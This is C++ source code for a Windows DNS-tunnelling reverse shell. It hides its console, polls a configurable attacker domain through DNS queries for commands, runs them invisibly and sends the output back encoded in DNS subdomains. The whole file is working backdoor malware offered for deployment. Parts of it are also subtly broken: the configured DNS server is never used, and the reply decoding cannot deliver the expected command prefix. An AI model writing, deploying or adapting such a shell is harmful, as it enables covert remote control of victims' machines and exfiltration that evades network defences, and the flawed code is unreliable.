// DNS TUNNEL REVERSE SHELL - C++ PORT
// Compile: g++ dns_shell.cpp -o dns_shell.exe -lws2_32 -static -lws2_32

#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <random>
#include <ctime>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define DOMAIN "tunnel.yourdomain.com"  // CHANGE THIS
#define DNS_SERVER "8.8.8.8"             // DNS server to query
#define POLL_INTERVAL 5000                // 5 seconds

class DNSReverseShell {
private:
    std::string domain;
    std::string dnsServer;
    std::string sessionId;
    WSADATA wsaData;
    
    std::string GenerateSessionId() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 25);
        
        std::string id;
        for (int i = 0; i < 4; i++) {
            id += 'a' + dis(gen);
        }
        return id;
    }
    
    std::string Base32Encode(const std::string& data) {
        static const char b32[] = "abcdefghijklmnopqrstuvwxyz234567";
        std::string result;
        int buffer = 0;
        int bitsLeft = 0;
        
        for (unsigned char c : data) {
            buffer = (buffer << 8) | c;
            bitsLeft += 8;
            while (bitsLeft >= 5) {
                bitsLeft -= 5;
                result += b32[(buffer >> bitsLeft) & 0x1F];
            }
        }
        if (bitsLeft > 0) {
            result += b32[(buffer << (5 - bitsLeft)) & 0x1F];
        }
        
        // Remove padding for DNS
        while (result.length() % 8 != 0)
            result += '=';
        
        return result;
    }
    
    std::string Base32Decode(const std::string& input) {
        static const char b32[] = "abcdefghijklmnopqrstuvwxyz234567";
        std::string result;
        int buffer = 0;
        int bitsLeft = 0;
        
        for (char c : input) {
            if (c == '=') break;
            
            // Find character in b32 table
            int val = -1;
            for (int i = 0; i < 32; i++) {
                if (b32[i] == tolower(c)) {
                    val = i;
                    break;
                }
            }
            if (val == -1) continue;
            
            buffer = (buffer << 5) | val;
            bitsLeft += 5;
            
            if (bitsLeft >= 8) {
                bitsLeft -= 8;
                result += (char)((buffer >> bitsLeft) & 0xFF);
            }
        }
        return result;
    }
    
    std::vector<std::string> SplitIntoChunks(const std::string& str, size_t chunkSize) {
        std::vector<std::string> chunks;
        for (size_t i = 0; i < str.length(); i += chunkSize) {
            chunks.push_back(str.substr(i, chunkSize));
        }
        return chunks;
    }
    
    std::string DnsQuery(const std::string& subdomain) {
        std::string query = subdomain + "." + domain;
        
        // Use Windows DNS API
        PDNS_RECORD pDnsRecord;
        DNS_STATUS status = DnsQuery_A(
            query.c_str(),
            DNS_TYPE_A,
            DNS_QUERY_STANDARD,
            NULL,
            &pDnsRecord,
            NULL
        );
        
        if (status == 0 && pDnsRecord) {
            // Get first IP address
            std::string ip = inet_ntoa(*(in_addr*)pDnsRecord->Data.A.IpAddress);
            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
            return ip;
        }
        
        return "";
    }
    
    std::string DecodeResponseIP(const std::string& ip) {
        std::vector<std::string> parts;
        std::stringstream ss(ip);
        std::string part;
        
        while (std::getline(ss, part, '.')) {
            parts.push_back(part);
        }
        
        if (parts.size() == 4) {
            std::string result;
            for (const auto& p : parts) {
                int val = std::stoi(p);
                if (val >= 32 && val <= 126) {
                    result += (char)val;
                }
            }
            return result;
        }
        
        return "";
    }
    
    std::string GetCommand() {
        std::string data = "GET:" + sessionId;
        std::string encoded = Base32Encode(data);
        
        auto chunks = SplitIntoChunks(encoded, 50);
        
        for (const auto& chunk : chunks) {
            std::string subdomain = "cmd." + chunk;
            std::string response = DnsQuery(subdomain);
            
            // Check for our custom marker (10.0.x.x)
            if (response.find("10.0.") == 0) {
                std::string decoded = DecodeResponseIP(response);
                if (!decoded.empty()) {
                    return decoded;
                }
            }
            
            Sleep(100);  // Small delay between queries
        }
        
        return "";
    }
    
    void SendOutput(const std::string& output) {
        std::string data = "RES:" + sessionId + ":" + output.substr(0, 200);
        std::string encoded = Base32Encode(data);
        
        auto chunks = SplitIntoChunks(encoded, 50);
        
        for (const auto& chunk : chunks) {
            std::string subdomain = "out." + chunk;
            DnsQuery(subdomain);  // We don't care about response
            Sleep(100);
        }
    }
    
    std::string ExecuteCommand(const std::string& command) {
        std::string result;
        
        // Handle 'cd' command
        if (command.find("cd ") == 0) {
            std::string path = command.substr(3);
            if (SetCurrentDirectory(path.c_str())) {
                char cwd[MAX_PATH];
                GetCurrentDirectory(MAX_PATH, cwd);
                result = std::string(cwd);
            } else {
                result = "Failed to change directory";
            }
            return result;
        }
        
        // Create pipes for I/O redirection
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hRead, hWrite;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
            return "Error creating pipe";
        
        STARTUPINFO si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        
        PROCESS_INFORMATION pi;
        
        if (CreateProcess(NULL, (LPSTR)command.c_str(), NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytesRead, NULL) 
                   && bytesRead > 0) {
                buffer[bytesRead] = 0;
                result += buffer;
            }
        }
        
        CloseHandle(hRead);
        CloseHandle(hWrite);
        
        if (result.empty())
            result = "[OK]";
        
        return result;
    }
    
    void HideConsole() {
        HWND hwnd = GetConsoleWindow();
        if (hwnd) ShowWindow(hwnd, SW_HIDE);
    }
    
public:
    DNSReverseShell(const std::string& d, const std::string& server) 
        : domain(d), dnsServer(server), sessionId(GenerateSessionId()) {
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        HideConsole();
    }
    
    ~DNSReverseShell() {
        WSACleanup();
    }
    
    void Run() {
        while (true) {
            std::string cmd = GetCommand();
            
            if (!cmd.empty()) {
                if (cmd.find("CMD:") == 0) {
                    std::string command = cmd.substr(4);
                    std::string output = ExecuteCommand(command);
                    SendOutput(output);
                }
            }
            
            Sleep(POLL_INTERVAL);
        }
    }
};

int main() {
    DNSReverseShell shell(DOMAIN, DNS_SERVER);
    shell.Run();
    return 0;
}